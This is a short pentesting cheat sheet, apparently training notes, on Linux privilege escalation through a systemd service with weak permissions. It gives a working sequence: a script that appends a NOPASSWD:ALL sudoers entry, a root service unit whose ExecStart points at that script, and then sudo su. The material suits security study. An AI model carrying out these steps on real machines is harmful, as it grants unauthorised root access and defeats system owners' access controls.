#### What is a Service
Services are **processes or applications running in the background** on a Linux system, often triggered by schedules or specific events rather than direct user actions. They are typically made up of **daemons** and can be essential system components or user-configured tasks.

Since many services are run with high privileges (e.g., as `root`), any misconfiguration can present an opportunity for privilege escalation.

#### Finding Services
**Enumerate a system for Service**
```bash
systemctl list-units --type=service
```

**Start a stopped service**
```bash
systemctl start [service]
```

#### Pspy Tool
```bash
./pspy
```

---
### Exploit a Service with Weak Permissions
**Create a new Bash Script to replace the current one.**
```bash
vim <exploit.sh>
```

**Add the limited user to the `sudoers` list.**
```bash
#!/bin/bash
echo "<username> ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

**Make the new Bash Script Executable**
```bash
chmod +x <exploit.sh>
```

#### Replace the `ExecStart` in the vulnerable `Service` to call your script (`exploit.sh`)
```bash
[Unit]
Description=This is a vulnerable service!
DefaultDependencies=no
After=network.target

[Service]
Type=simple
User=root
Group=root
ExecStart=/home/<username>/exploit.sh
TimeoutStartSec=0
RemainAfterExit=yes

[Install]
WantedBy=default.target
```

Once the `Service is restarted`, the exploit.sh script will now run as root, updating the permission of the user.

#### Escalate the Privilege
```bash
sudo su
```